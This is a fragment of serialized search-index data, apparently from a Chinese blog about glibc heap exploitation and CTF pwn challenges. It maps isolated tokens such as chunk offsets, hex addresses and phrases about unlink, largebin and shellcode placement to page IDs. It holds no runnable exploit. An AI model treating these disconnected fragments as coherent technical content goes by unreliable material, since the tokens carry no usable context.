是否等于p\",{\"1\":{\"129\":1}}],[\">fd被赋值victim\",{\"1\":{\"110\":1}}],[\">fd也就是目标地址\",{\"1\":{\"110\":1}}],[\">fd置为\",{\"1\":{\"81\":1}}],[\">fd\",{\"0\":{\"152\":1},\"1\":{\"81\":14,\"90\":2,\"97\":2,\"98\":3,\"99\":1,\"102\":2,\"103\":2,\"104\":14,\"106\":6,\"109\":7,\"110\":11,\"124\":2,\"129\":17,\"130\":4,\"150\":1,\"163\":2,\"285\":2}}],[\">cs位0x23\",{\"1\":{\"268\":1}}],[\">chunk2\",{\"1\":{\"124\":5}}],[\">chunk1的死循环\",{\"1\":{\"124\":1}}],[\">chunk1\",{\"1\":{\"124\":5}}],[\">chunk<\",{\"1\":{\"104\":1}}],[\">counts\",{\"1\":{\"100\":1,\"109\":1,\"127\":1}}],[\">bk成功\",{\"1\":{\"154\":1}}],[\">bk那样直接free\",{\"1\":{\"152\":1}}],[\">bk也就是fd+0x18的位置为p\",{\"1\":{\"130\":1}}],[\">bk等于fd\",{\"1\":{\"129\":1}}],[\">bk和bk\",{\"1\":{\"129\":1,\"130\":1}}],[\">bk应该就是最后一位\",{\"1\":{\"104\":1}}],[\">bk来进行的定位\",{\"1\":{\"101\":1}}],[\">bk与\",{\"1\":{\"81\":1}}],[\">bk设置为\",{\"1\":{\"81\":1}}],[\">bk\",{\"0\":{\"151\":1},\"1\":{\"81\":13,\"90\":2,\"91\":1,\"95\":2,\"97\":2,\"98\":3,\"99\":1,\"102\":2,\"104\":15,\"106\":6,\"109\":4,\"110\":16,\"129\":14,\"130\":4,\"150\":1}}],[\">一般我们要改成true\",{\"1\":{\"37\":1}}],[\">\",{\"1\":{\"27\":5,\"95\":1,\"97\":2,\"98\":1,\"109\":1,\"135\":2,\"137\":1,\"138\":1,\"173\":1,\"180\":2,\"182\":13,\"195\":28,\"211\":22,\"231\":1,\"245\":1}}],[\">java\",{\"1\":{\"16\":1}}],[\"88\",{\"1\":{\"288\":1}}],[\"888\",{\"1\":{\"20\":1,\"21\":1}}],[\"8号就是我们要修改的chunk\",{\"1\":{\"276\":1}}],[\"8位置\",{\"1\":{\"264\":1}}],[\"8byte\",{\"0\":{\"228\":1}}],[\"8时\",{\"1\":{\"158\":1,\"280\":1}}],[\"8个\",{\"1\":{\"143\":1}}],[\"8个chunk\",{\"1\":{\"143\":1}}],[\"892\",{\"1\":{\"46\":1}}],[\"80\",{\"1\":{\"46\":5,\"255\":1,\"268\":1}}],[\"8\",{\"1\":{\"27\":1,\"47\":1,\"74\":1,\"75\":1,\"77\":2,\"143\":2,\"144\":1,\"150\":11,\"151\":2,\"152\":1,\"153\":2,\"154\":17,\"158\":5,\"161\":4,\"163\":2,\"165\":6,\"182\":1,\"244\":1,\"246\":2,\"258\":1,\"260\":3,\"264\":2,\"265\":1,\"266\":2,\"267\":1,\"268\":1,\"269\":1,\"271\":1,\"273\":4,\"276\":8,\"280\":5,\"283\":4,\"285\":2,\"287\":6,\"288\":27,\"289\":1,\"290\":2}}],[\"执行exec\",{\"1\":{\"239\":1}}],[\"执行\",{\"1\":{\"208\":1}}],[\"执行后new\",{\"1\":{\"196\":1}}],[\"执行largebin的入chunk\",{\"1\":{\"104\":1}}],[\"执行指令objection\",{\"1\":{\"29\":1}}],[\"执行成功\",{\"1\":{\"27\":1}}],[\"执行完上面的hook指令后发现了报错\",{\"1\":{\"27\":1}}],[\"0ll\",{\"1\":{\"244\":10,\"245\":1}}],[\"0和tel\",{\"1\":{\"175\":1}}],[\"0的bk\",{\"1\":{\"150\":1}}],[\"0即可\",{\"1\":{\"130\":1}}],[\"07\",{\"1\":{\"96\":2,\"222\":1}}],[\"06\",{\"1\":{\"96\":2,\"222\":1}}],[\"05\",{\"1\":{\"96\":2,\"131\":1}}],[\"02\",{\"1\":{\"96\":2,\"131\":1}}],[\"01\",{\"1\":{\"96\":2}}],[\"0038│\",{\"1\":{\"96\":2}}],[\"0030│\",{\"1\":{\"96\":2}}],[\"0028│\",{\"1\":{\"96\":2}}],[\"0020│\",{\"1\":{\"96\":2}}],[\"0018│\",{\"1\":{\"96\":2}}],[\"0010│\",{\"1\":{\"96\":2}}],[\"00000000004007f4\",{\"1\":{\"255\":1}}],[\"0000│\",{\"1\":{\"96\":2}}],[\"000\",{\"1\":{\"193\":14}}],[\"0008│\",{\"1\":{\"96\":2}}],[\"00\",{\"1\":{\"96\":2,\"255\":1}}],[\"0xb6\",{\"1\":{\"269\":2}}],[\"0xbf\",{\"1\":{\"269\":2}}],[\"0xb0\",{\"1\":{\"269\":1}}],[\"0xb9\",{\"1\":{\"269\":2}}],[\"0xbe\",{\"1\":{\"269\":6}}],[\"0xb7\",{\"1\":{\"269\":5}}],[\"0xacf8a0\",{\"1\":{\"276\":1}}],[\"0xacf8c0\",{\"1\":{\"276\":1}}],[\"0xacf8e0\",{\"1\":{\"276\":1}}],[\"0xae4000\",{\"1\":{\"276\":1}}],[\"0xae4400\",{\"1\":{\"276\":1}}],[\"0xae\",{\"1\":{\"269\":1}}],[\"0xa6\",{\"1\":{\"269\":2}}],[\"0xa7\",{\"1\":{\"269\":1}}],[\"0xa4\",{\"1\":{\"269\":1}}],[\"0xad\",{\"1\":{\"269\":5}}],[\"0xa1\",{\"1\":{\"269\":1}}],[\"0xa5\",{\"1\":{\"269\":6}}],[\"0xaf\",{\"1\":{\"269\":5}}],[\"0xa0\",{\"1\":{\"143\":2,\"144\":1,\"173\":1,\"181\":1,\"182\":2}}],[\"0xe3b01+base\",{\"1\":{\"273\":1}}],[\"0xe3b31\",{\"1\":{\"260\":1}}],[\"0xe7\",{\"1\":{\"269\":3}}],[\"0xe6\",{\"1\":{\"269\":3}}],[\"0xe9\",{\"1\":{\"269\":3}}],[\"0xe5\",{\"1\":{\"269\":23}}],[\"0xe8\",{\"1\":{\"269\":14}}],[\"0xe0\",{\"1\":{\"181\":1,\"182\":2}}],[\"0xc7df9b0041348000\",{\"1\":{\"255\":1}}],[\"0xc0\",{\"1\":{\"182\":2}}],[\"0xfa\",{\"1\":{\"247\":1}}],[\"0xffffffffffffffff\",{\"1\":{\"288\":1}}],[\"0xffffffff\",{\"1\":{\"268\":1}}],[\"0xfffffffc\",{\"1\":{\"247\":1}}],[\"0xffffffda\",{\"1\":{\"247\":1}}],[\"0xffffff9b\",{\"1\":{\"247\":1}}],[\"0xffffff95\",{\"1\":{\"247\":1}}],[\"0xffffff9c\",{\"1\":{\"247\":1}}],[\"0xffffff92\",{\"1\":{\"247\":1}}],[\"0xf0\",{\"1\":{\"173\":1}}],[\"0x60\",{\"1\":{\"288\":1}}],[\"0x67616c662f2e\",{\"1\":{\"268\":1}}],[\"0x6c662f2e\",{\"1\":{\"268\":1}}],[\"0x61cc0\",{\"1\":{\"264\":1}}],[\"0x61+i\",{\"1\":{\"260\":2}}],[\"0x61fe1c\",{\"1\":{\"255\":1}}],[\"0x69\",{\"1\":{\"246\":1,\"247\":1}}],[\"0x65\",{\"1\":{\"246\":1,\"247\":1}}],[\"0x66\",{\"1\":{\"246\":1,\"247\":1}}],[\"0x68\",{\"1\":{\"158\":1,\"163\":1,\"165\":8,\"260\":2,\"280\":1,\"285\":1,\"287\":8,\"288\":8}}],[\"0x7\",{\"1\":{\"268\":1}}],[\"0x7620656854006625\",{\"1\":{\"255\":1}}],[\"0x78\",{\"1\":{\"246\":1,\"247\":1,\"273\":3,\"288\":10}}],[\"0x74\",{\"1\":{\"246\":1,\"247\":1}}],[\"0x77\",{\"1\":{\"246\":1,\"247\":1}}],[\"0x7c00到0x90000\",{\"0\":{\"220\":1}}],[\"0x7fe867b61160\",{\"1\":{\"288\":1}}],[\"0x7f291e5b6000\",{\"1\":{\"260\":1}}],[\"0x7f291e7a2b70\",{\"1\":{\"260\":1}}],[\"0x7ffff000\",{\"1\":{\"270\":1}}],[\"0x7fffffffdee4\",{\"1\":{\"255\":1}}],[\"0x7ffff7fb5f60\",{\"1\":{\"196\":1}}],[\"0x7ffff7fb9c18\",{\"1\":{\"96\":2}}],[\"0x7ffff7fb9c10\",{\"1\":{\"96\":2}}],[\"0x7ffff7fb9c08\",{\"1\":{\"96\":2}}],[\"0x7ffff7fb9c00\",{\"1\":{\"96\":6}}],[\"0x7ffff7fb9bf8\",{\"1\":{\"96\":2}}],[\"0x7ffff7fb9bf0\",{\"1\":{\"96\":10}}],[\"0x7ffff7fb9be8\",{\"1\":{\"96\":2}}],[\"0x7ffff7fb9be0\",{\"1\":{\"96\":13}}],[\"0x7ffff7a52390\",{\"1\":{\"189\":1}}],[\"0x7f566befac78\",{\"1\":{\"72\":1}}],[\"0xd8\",{\"1\":{\"173\":1,\"182\":2}}],[\"0x5600edb1d000\",{\"1\":{\"288\":1}}],[\"0x5600edb1db20\",{\"1\":{\"288\":1}}],[\"0x5633731e9da0\",{\"1\":{\"288\":1}}],[\"0x5\",{\"1\":{\"268\":1}}],[\"0x500\",{\"1\":{\"276\":1}}],[\"0x50a47+baselibc\",{\"1\":{\"266\":1}}],[\"0x50d70\",{\"1\":{\"258\":1}}],[\"0x58\",{\"1\":{\"162\":1,\"284\":1,\"288\":3}}],[\"0x556f2107b000\",{\"1\":{\"288\":1}}],[\"0x556f210bd050\",{\"1\":{\"288\":1}}],[\"0x555555556004\",{\"1\":{\"255\":1}}],[\"0x5555555551c7\",{\"1\":{\"255\":1}}],[\"0x55555555983\",{\"1\":{\"96\":1}}],[\"0x555555559830\",{\"1\":{\"96\":6}}],[\"0x555555559710\",{\"1\":{\"96\":1}}],[\"0x5555555597a0\",{\"1\":{\"96\":1}}],[\"0x555555559680\",{\"1\":{\"96\":9}}],[\"0x550偏移位置坐标在哪里\",{\"1\":{\"153\":1}}],[\"0x550\",{\"1\":{\"153\":1,\"154\":1}}],[\"0x551\",{\"1\":{\"150\":1,\"154\":1}}],[\"0x55e22cd98000+0x10\",{\"1\":{\"72\":1}}],[\"0x29\",{\"1\":{\"269\":1}}],[\"0x29dc0\",{\"1\":{\"258\":1,\"266\":1}}],[\"0x23\",{\"1\":{\"268\":2}}],[\"0x22\",{\"1\":{\"268\":1}}],[\"0x28+pop\",{\"1\":{\"289\":1}}],[\"0x28+b\",{\"1\":{\"266\":1}}],[\"0x28c0\",{\"1\":{\"288\":1}}],[\"0x28\",{\"1\":{\"258\":1,\"268\":2,\"269\":1,\"290\":1}}],[\"0x28u\",{\"1\":{\"244\":1}}],[\"0x21\",{\"1\":{\"162\":1,\"163\":1,\"284\":1,\"285\":1}}],[\"0x20+p64\",{\"1\":{\"266\":1}}],[\"0x2072+0x78+baselibc\",{\"1\":{\"266\":1}}],[\"0x200\",{\"1\":{\"182\":3}}],[\"0x20c30\",{\"1\":{\"165\":1,\"287\":1}}],[\"0x20\",{\"1\":{\"75\":2,\"110\":1,\"142\":1,\"156\":1,\"161\":1,\"182\":4,\"258\":1,\"268\":2,\"269\":5,\"273\":3,\"276\":2,\"278\":1,\"283\":1}}],[\"0x38\",{\"1\":{\"276\":1,\"288\":3}}],[\"0x38+p64\",{\"1\":{\"264\":1}}],[\"0x3a\",{\"1\":{\"269\":5}}],[\"0x3\",{\"1\":{\"268\":1}}],[\"0x31\",{\"1\":{\"165\":1,\"276\":1,\"287\":1}}],[\"0x30\",{\"1\":{\"161\":1,\"256\":1,\"283\":1,\"288\":2}}],[\"0x3b0\",{\"1\":{\"152\":1,\"154\":1,\"288\":1}}],[\"0x4c8000\",{\"1\":{\"289\":1}}],[\"0x4482c0\",{\"1\":{\"289\":1}}],[\"0x447580\",{\"1\":{\"289\":1}}],[\"0x44+p32\",{\"1\":{\"270\":1}}],[\"0x451322\",{\"1\":{\"289\":1}}],[\"0x450\",{\"1\":{\"150\":1,\"154\":1}}],[\"0x493460\",{\"1\":{\"270\":1}}],[\"0x493400\",{\"1\":{\"270\":1}}],[\"0x4\",{\"1\":{\"268\":1}}],[\"0x41348000\",{\"1\":{\"256\":1}}],[\"0x410\",{\"1\":{\"150\":3,\"151\":2,\"154\":5}}],[\"0x409f8e\",{\"1\":{\"289\":1}}],[\"0x40\",{\"1\":{\"288\":2}}],[\"0x40+p32\",{\"1\":{\"270\":1,\"271\":2}}],[\"0x404060+0x100\",{\"1\":{\"290\":1}}],[\"0x404070\",{\"1\":{\"260\":1}}],[\"0x404020+0x100\",{\"1\":{\"258\":1}}],[\"0x404020+0x200\",{\"1\":{\"258\":1}}],[\"0x401f1f\",{\"1\":{\"289\":1}}],[\"0x40133a\",{\"1\":{\"265\":1}}],[\"0x401321\",{\"1\":{\"265\":1}}],[\"0x401050\",{\"1\":{\"260\":1}}],[\"0x40101a\",{\"1\":{\"258\":1,\"289\":1,\"290\":1}}],[\"0x40129d\",{\"1\":{\"290\":1}}],[\"0x401296\",{\"1\":{\"290\":1}}],[\"0x40122d\",{\"1\":{\"258\":1}}],[\"0x401202\",{\"1\":{\"258\":1}}],[\"0x4012cb\",{\"1\":{\"258\":1}}],[\"0x4012dc\",{\"1\":{\"258\":1}}],[\"0x4012d0\",{\"1\":{\"258\":1}}],[\"0x4012a0\",{\"1\":{\"258\":1}}],[\"0x401700^res\",{\"1\":{\"165\":1,\"287\":1}}],[\"0x400864\",{\"1\":{\"270\":1}}],[\"0x400000\",{\"1\":{\"254\":1}}],[\"0x400\",{\"1\":{\"153\":1,\"154\":1,\"276\":1}}],[\"0x48\",{\"1\":{\"163\":4,\"276\":1,\"285\":4,\"288\":1}}],[\"0x488\",{\"1\":{\"152\":1,\"154\":1}}],[\"0x480\",{\"1\":{\"150\":1,\"154\":1}}],[\"0x4f0\",{\"1\":{\"152\":1,\"154\":1}}],[\"0x431\",{\"1\":{\"152\":1,\"154\":1}}],[\"0x438\",{\"1\":{\"150\":1,\"154\":1}}],[\"0x430\",{\"1\":{\"150\":2,\"154\":2,\"276\":1}}],[\"0x420\",{\"1\":{\"142\":1,\"150\":2,\"154\":2}}],[\"0x86\",{\"1\":{\"269\":2}}],[\"0x8b\",{\"1\":{\"269\":1}}],[\"0x84\",{\"1\":{\"269\":2}}],[\"0x84420\",{\"1\":{\"182\":1}}],[\"0x8afc4\",{\"1\":{\"271\":1}}],[\"0x8a\",{\"1\":{\"269\":1}}],[\"0x87\",{\"1\":{\"269\":1}}],[\"0x88\",{\"1\":{\"269\":3}}],[\"0x81\",{\"1\":{\"269\":4}}],[\"0x8f\",{\"1\":{\"269\":1}}],[\"0x8d\",{\"1\":{\"269\":5}}],[\"0x89\",{\"1\":{\"269\":1}}],[\"0x85\",{\"1\":{\"269\":8}}],[\"0x80e50\",{\"1\":{\"276\":1}}],[\"0x80\",{\"1\":{\"268\":3,\"269\":1,\"273\":1}}],[\"0x800\",{\"1\":{\"182\":2}}],[\"0x8\",{\"1\":{\"114\":1,\"161\":1,\"264\":2,\"283\":1}}],[\"0x00006761\",{\"1\":{\"268\":1}}],[\"0x00006b4b\",{\"1\":{\"247\":1}}],[\"0x00001f11\",{\"1\":{\"247\":1}}],[\"0x0000177b\",{\"1\":{\"247\":1}}],[\"0x000040ce\",{\"1\":{\"247\":1}}],[\"0x00004506\",{\"1\":{\"247\":1}}],[\"0x00004ff3\",{\"1\":{\"247\":1}}],[\"0x000052fb\",{\"1\":{\"247\":1}}],[\"0x000055e22cd98a10+0x30+0x110\",{\"1\":{\"72\":1}}],[\"0x000029e3\",{\"1\":{\"247\":1}}],[\"0x00002989\",{\"1\":{\"247\":1}}],[\"0x000028b4\",{\"1\":{\"247\":1}}],[\"0x000028fa\",{\"1\":{\"247\":1}}],[\"0x00002a6f\",{\"1\":{\"247\":1}}],[\"0x00002b71\",{\"1\":{\"247\":1}}],[\"0x0000264f\",{\"1\":{\"247\":1}}],[\"0x00002f14\",{\"1\":{\"247\":1}}],[\"0x000032d8\",{\"1\":{\"247\":1}}],[\"0x000000ff\",{\"1\":{\"247\":1}}],[\"0x0000000f\",{\"1\":{\"247\":1}}],[\"0x0000007d\",{\"1\":{\"247\":1}}],[\"0x0000001d\",{\"1\":{\"247\":1}}],[\"0x00000014\",{\"1\":{\"247\":1}}],[\"0x0000005b\",{\"1\":{\"247\":1}}],[\"0x0000006d\",{\"1\":{\"247\":2}}],[\"0x0000004e\",{\"1\":{\"247\":2}}],[\"0x0001\",{\"1\":{\"219\":2}}],[\"0x07c0\",{\"1\":{\"218\":1,\"220\":2}}],[\"0x0\",{\"1\":{\"96\":13,\"182\":1,\"193\":40,\"260\":1,\"268\":1,\"276\":1}}],[\"0x9d\",{\"1\":{\"269\":1}}],[\"0x98\",{\"1\":{\"269\":1}}],[\"0x9c\",{\"1\":{\"269\":1}}],[\"0x9f\",{\"1\":{\"269\":1}}],[\"0x9a\",{\"1\":{\"269\":2}}],[\"0x94\",{\"1\":{\"269\":1}}],[\"0x96\",{\"1\":{\"269\":1}}],[\"0x9b\",{\"1\":{\"269\":2}}],[\"0x97\",{\"1\":{\"269\":4}}],[\"0x93\",{\"1\":{\"269\":5}}],[\"0x91\",{\"1\":{\"96\":1,\"288\":1}}],[\"0x9000\",{\"1\":{\"220\":3}}],[\"0x90均存满\",{\"1\":{\"161\":1,\"283\":1}}],[\"0x90\",{\"1\":{\"96\":2,\"144\":1,\"269\":3}}],[\"0x1279d20\",{\"1\":{\"276\":2}}],[\"0x1279d00\",{\"1\":{\"276\":4}}],[\"0x120\",{\"1\":{\"273\":3}}],[\"0x1baf400\",{\"1\":{\"276\":1}}],[\"0x170\",{\"1\":{\"273\":1}}],[\"0x130\",{\"1\":{\"273\":1}}],[\"0x130+p64\",{\"1\":{\"273\":1}}],[\"0x138\",{\"1\":{\"273\":1}}],[\"0x1603000\",{\"1\":{\"276\":1}}],[\"0x1603d00\",{\"1\":{\"276\":1}}],[\"0x1603d20\",{\"1\":{\"276\":1}}],[\"0x160\",{\"1\":{\"268\":1}}],[\"0x14514420\",{\"1\":{\"268\":1}}],[\"0x14514400\",{\"1\":{\"268\":1}}],[\"0x14514009\",{\"1\":{\"268\":1}}],[\"0x14514000\",{\"1\":{\"268\":3}}],[\"0x11\",{\"1\":{\"288\":2}}],[\"0x110大小chunk\",{\"1\":{\"276\":1}}],[\"0x11451406a\",{\"1\":{\"268\":1}}],[\"0x114514061\",{\"1\":{\"268\":3}}],[\"0x11451404d\",{\"1\":{\"268\":1}}],[\"0x114514000\",{\"1\":{\"268\":1}}],[\"0x11u\",{\"1\":{\"244\":1,\"246\":1}}],[\"0x1ea0\",{\"1\":{\"288\":1}}],[\"0x1e8c60\",{\"1\":{\"182\":1}}],[\"0x1ed5c0\",{\"1\":{\"182\":1}}],[\"0x18位置改为我们要执行函数的地址\",{\"1\":{\"182\":1}}],[\"0x18位置写入我们要触发的函数\",{\"1\":{\"181\":1}}],[\"0x18的位置\",{\"1\":{\"130\":1}}],[\"0x18\",{\"1\":{\"81\":3,\"130\":1,\"143\":1,\"144\":1,\"158\":1,\"161\":2,\"163\":1,\"165\":1,\"182\":1,\"276\":5,\"280\":1,\"283\":2,\"285\":1,\"287\":1}}],[\"0x10588\",{\"1\":{\"271\":1}}],[\"0x101\",{\"1\":{\"268\":1}}],[\"0x108\",{\"1\":{\"153\":1,\"154\":1}}],[\"0x100+p64\",{\"1\":{\"273\":1}}],[\"0x1000\",{\"1\":{\"268\":1}}],[\"0x100\",{\"1\":{\"150\":2,\"153\":1,\"154\":3,\"162\":1,\"163\":1,\"165\":1,\"267\":1,\"268\":1,\"269\":1,\"273\":3,\"276\":1,\"284\":1,\"285\":1,\"287\":1,\"288\":4}}],[\"0x10时\",{\"1\":{\"110\":1}}],[\"0x10\",{\"1\":{\"72\":1,\"78\":1,\"81\":3,\"124\":1,\"130\":1,\"143\":2,\"144\":2,\"150\":1,\"153\":1,\"154\":2,\"273\":3,\"288\":1}}],[\"0x\",{\"1\":{\"75\":1,\"288\":1}}],[\"033\",{\"1\":{\"182\":1}}],[\"03\",{\"1\":{\"58\":1,\"96\":2}}],[\"04pwn环境\",{\"1\":{\"47\":1}}],[\"04安装python3\",{\"1\":{\"47\":1}}],[\"04进行搭建轻量级环境\",{\"1\":{\"47\":1}}],[\"04版本的也就是libc版本为2\",{\"1\":{\"47\":1}}],[\"04\",{\"1\":{\"42\":4,\"43\":3,\"96\":2,\"131\":1}}],[\"0\",{\"0\":{\"48\":1,\"270\":1,\"271\":1},\"1\":{\"27\":9,\"43\":2,\"46\":1,\"66\":2,\"75\":4,\"77\":1,\"81\":2,\"98\":1,\"106\":1,\"109\":12,\"124\":6,\"129\":1,\"130\":1,\"132\":2,\"136\":1,\"137\":4,\"138\":3,\"143\":7,\"144\":8,\"150\":7,\"151\":1,\"154\":6,\"158\":2,\"162\":1,\"163\":4,\"165\":4,\"175\":1,\"182\":4,\"188\":2,\"193\":25,\"195\":3,\"202\":1,\"211\":6,\"220\":2,\"223\":1,\"224\":3,\"226\":1,\"227\":2,\"234\":4,\"243\":1,\"244\":9,\"246\":12,\"247\":3,\"248\":1,\"254\":2,\"255\":1,\"258\":3,\"264\":2,\"265\":2,\"266\":1,\"268\":4,\"270\":2,\"271\":2,\"273\":5,\"276\":5,\"280\":2,\"284\":1,\"285\":4,\"287\":4,\"288\":9,\"289\":1,\"290\":2}}],[\"然后glibc\",{\"1\":{\"276\":1}}],[\"然后让这些chunk合并进入unsortedbin\",{\"1\":{\"275\":1}}],[\"然后一个content\",{\"1\":{\"274\":1}}],[\"然后一个属性为data也就是数据本身\",{\"1\":{\"186\":1}}],[\"然后ac都为unsortedbin\",{\"1\":{\"273\":1}}],[\"然后add\",{\"1\":{\"152\":1}}],[\"然后shellcode\",{\"1\":{\"271\":1}}],[\"然后到bss端执行shellcode\",{\"1\":{\"270\":1}}],[\"然后输出chunk内容\",{\"1\":{\"272\":1}}],[\"然后输出\",{\"1\":{\"269\":1}}],[\"然后把shellcode\",{\"1\":{\"268\":1}}],[\"然后rsi就是我们输入的字符串地址\",{\"1\":{\"267\":1}}],[\"然后rep\",{\"1\":{\"220\":1}}],[\"然后发现跳转到执行shellcode的地方的时候寄存器上已经几乎布置好了一些我们需要的值\",{\"1\":{\"267\":1}}],[\"然后发生报错\",{\"1\":{\"27\":1}}],[\"然后第二次通过scanf来向目标地址写入数据\",{\"1\":{\"261\":1}}],[\"然后第二个chunk要在\",{\"1\":{\"181\":1}}],[\"然后前六个参数都是寄存器\",{\"1\":{\"261\":1}}],[\"然后通过申请一个largebin\",{\"1\":{\"275\":1}}],[\"然后通过修改返回地址最后一个字节\",{\"1\":{\"265\":1}}],[\"然后通过第二次double\",{\"1\":{\"259\":1}}],[\"然后通过指向bss表中\",{\"1\":{\"259\":1}}],[\"然后触发rep\",{\"1\":{\"267\":1}}],[\"然后触发system函数\",{\"1\":{\"258\":1}}],[\"然后触发合并\",{\"1\":{\"161\":2,\"283\":2}}],[\"然后分别开启四个函数\",{\"1\":{\"245\":1}}],[\"然后分析即可\",{\"1\":{\"40\":1}}],[\"然后准备对应环境\",{\"1\":{\"239\":1}}],[\"然后执行指令ret\",{\"1\":{\"231\":1}}],[\"然后执行代码\",{\"1\":{\"218\":1}}],[\"然后就可以在第二次返回的时候触发backdoor函数\",{\"1\":{\"265\":1}}],[\"然后就会执行\",{\"1\":{\"231\":1}}],[\"然后就是寻找ld\",{\"1\":{\"238\":1}}],[\"然后就是从unsortedbin割small\",{\"1\":{\"98\":1}}],[\"然后就是我没找到ubuntu16\",{\"1\":{\"47\":1}}],[\"然后调用\",{\"1\":{\"205\":1}}],[\"然后后面的通过\",{\"1\":{\"202\":1}}],[\"然后各种回调函数属性\",{\"1\":{\"186\":1}}],[\"然后会触发检查vatble是否合法\",{\"1\":{\"179\":1}}],[\"然后指向exit\",{\"1\":{\"165\":1,\"287\":1}}],[\"然后write直接泄露即可\",{\"1\":{\"158\":1,\"280\":1}}],[\"然后申请回来利用chunk中保留有关libc和heap的地址然后推算出libc基地址和heap基地址\",{\"1\":{\"158\":1,\"280\":1}}],[\"然后利用off\",{\"1\":{\"151\":1}}],[\"然后合成一个0x860的大chunk\",{\"1\":{\"150\":1,\"154\":1}}],[\"然后修改思路\",{\"1\":{\"144\":1}}],[\"然后malloc一个较大的chunk\",{\"1\":{\"161\":1,\"283\":1}}],[\"然后malloc回来\",{\"1\":{\"153\":1}}],[\"然后malloc\",{\"1\":{\"143\":1}}],[\"然后malloc要回来\",{\"1\":{\"142\":1}}],[\"然后加锁进行分配\",{\"1\":{\"134\":1}}],[\"然后加锁分配\",{\"1\":{\"134\":1}}],[\"然后那么根据源码最终ptr会指向fd也就是ptr\",{\"1\":{\"130\":1}}],[\"然后多的一个字节为0的话\",{\"1\":{\"130\":1}}],[\"然后bk\",{\"1\":{\"129\":1}}],[\"然后bck通过fwd\",{\"1\":{\"101\":1}}],[\"然后fastbin中存在\",{\"1\":{\"273\":1}}],[\"然后fd\",{\"1\":{\"129\":1}}],[\"然后free第二个chunk\",{\"1\":{\"163\":1,\"285\":1}}],[\"然后free掉\",{\"1\":{\"157\":1,\"279\":1}}],[\"然后free\",{\"1\":{\"87\":2,\"143\":1}}],[\"然后根据add函数的逻辑\",{\"1\":{\"142\":1}}],[\"然后根据源码\",{\"1\":{\"124\":1}}],[\"然后根据docker从0搭建ubuntu16\",{\"1\":{\"47\":1}}],[\"然后此时chunk1的fd指向chunk2然后我们再次free\",{\"1\":{\"124\":1}}],[\"然后从top\",{\"1\":{\"115\":2}}],[\"然后找\",{\"1\":{\"115\":1}}],[\"然后找到我们的com\",{\"1\":{\"30\":1}}],[\"然后再构造里面的fd让它指向fastbin\",{\"1\":{\"276\":1}}],[\"然后再free\",{\"1\":{\"142\":1}}],[\"然后再从top\",{\"1\":{\"114\":1}}],[\"然后再搜索top\",{\"1\":{\"114\":1}}],[\"然后当p为0的时候\",{\"1\":{\"114\":1}}],[\"然后当这个事件完成的时候再自动触发其回调函数\",{\"1\":{\"64\":1}}],[\"然后也因为victim\",{\"1\":{\"110\":1}}],[\"然后也没彻底理解一些操作\",{\"1\":{\"93\":1}}],[\"然后largebin中最大的chunk大于我们的需求\",{\"1\":{\"106\":1}}],[\"然后要加入fwd和bck之间\",{\"1\":{\"104\":1}}],[\"然后判断该插入什么合适的位置\",{\"1\":{\"104\":1}}],[\"然后直接返回\",{\"1\":{\"100\":1}}],[\"然后直接打印出来\",{\"1\":{\"78\":1}}],[\"然后将free\",{\"1\":{\"226\":1}}],[\"然后将利用开始构造好的fakechunk进行free\",{\"1\":{\"163\":1,\"285\":1}}],[\"然后将victim返回给用户\",{\"1\":{\"98\":1}}],[\"然后将遇到的报错展示出来\",{\"1\":{\"43\":1}}],[\"然后查看chunk结构\",{\"1\":{\"96\":1}}],[\"然后chunk入链\",{\"1\":{\"120\":1}}],[\"然后chunk\",{\"1\":{\"93\":1}}],[\"然后在scanf里面下idapython脚本\",{\"1\":{\"255\":1}}],[\"然后在我们输入最后的位置加入249数据\",{\"1\":{\"245\":1}}],[\"然后在最后申请chunk\",{\"1\":{\"161\":1,\"283\":1}}],[\"然后在malloc的时候没有检查size\",{\"1\":{\"127\":1}}],[\"然后在正式阅读源码之前\",{\"1\":{\"93\":1}}],[\"然后在创立项目的时候\",{\"1\":{\"1\":1}}],[\"然后重点是检查机制部分\",{\"1\":{\"93\":1}}],[\"然后构造目标地址+0x18位置的地址为victim的地址\",{\"1\":{\"91\":1}}],[\"然后自己看的glibc2\",{\"1\":{\"89\":1}}],[\"然后是否内存对齐\",{\"1\":{\"74\":1}}],[\"然后我发现一个状况\",{\"1\":{\"143\":1}}],[\"然后我们再通过malloc\",{\"1\":{\"273\":1}}],[\"然后我们通过劫持程序流程跑到printf处\",{\"1\":{\"258\":1}}],[\"然后我们通过malloc指定大小的chunk来分割这个chunk\",{\"1\":{\"159\":1,\"281\":1}}],[\"然后我们就可以通过\",{\"1\":{\"236\":1}}],[\"然后我们就成功完成了一次栈迁移\",{\"1\":{\"231\":1}}],[\"然后我们就得到了main\",{\"1\":{\"72\":1}}],[\"然后我们成功完成一次overlapping\",{\"1\":{\"153\":1}}],[\"然后我们分割一个chunk\",{\"1\":{\"152\":1}}],[\"然后我们将这个大chunk分割为chunk3\",{\"1\":{\"150\":1}}],[\"然后我们控制我们的payload\",{\"1\":{\"150\":1,\"154\":1}}],[\"然后我们修改chunk2fd指向我们想要修改的地方\",{\"1\":{\"124\":1}}],[\"然后我们malloc一下\",{\"1\":{\"124\":1}}],[\"然后我们得到了一堆数据\",{\"1\":{\"27\":1}}],[\"然后我想重新合并回去\",{\"1\":{\"60\":1}}],[\"然后进行了修改\",{\"1\":{\"60\":1}}],[\"然后等待一堆人讨论后再合并\",{\"1\":{\"54\":1}}],[\"然后忘记存快照了\",{\"1\":{\"44\":1}}],[\"然后开启destop后\",{\"1\":{\"43\":1}}],[\"然后因为我下载了docker\",{\"1\":{\"43\":1}}],[\"然后这个东西被getcursorposition调用的\",{\"1\":{\"32\":1}}],[\"然后搜索发现是我修改了默认的端口号为11451\",{\"1\":{\"27\":1}}],[\"然后搜索package=xxxx这个xxxx就是包的名字\",{\"1\":{\"26\":1}}],[\"然后\",{\"1\":{\"27\":1,\"74\":1,\"121\":1,\"231\":1,\"236\":1}}],[\"xc3\",{\"1\":{\"271\":2}}],[\"x8d\",{\"1\":{\"271\":3}}],[\"x8f\",{\"1\":{\"271\":2}}],[\"x86\",{\"1\":{\"234\":1,\"241\":1}}],[\"x86为了让自己在16位这个实模式\",{\"1\":{\"220\":1}}],[\"xa0\",{\"1\":{\"271\":1}}],[\"xab\",{\"1\":{\"270\":1}}],[\"xa4\",{\"1\":{\"267\":1}}],[\"xef\",{\"1\":{\"271\":1}}],[\"xe1\",{\"1\":{\"271\":1}}],[\"xe5\",{\"1\":{\"271\":4}}],[\"xe2\",{\"1\":{\"271\":3}}],[\"xe4\",{\"1\":{\"270\":1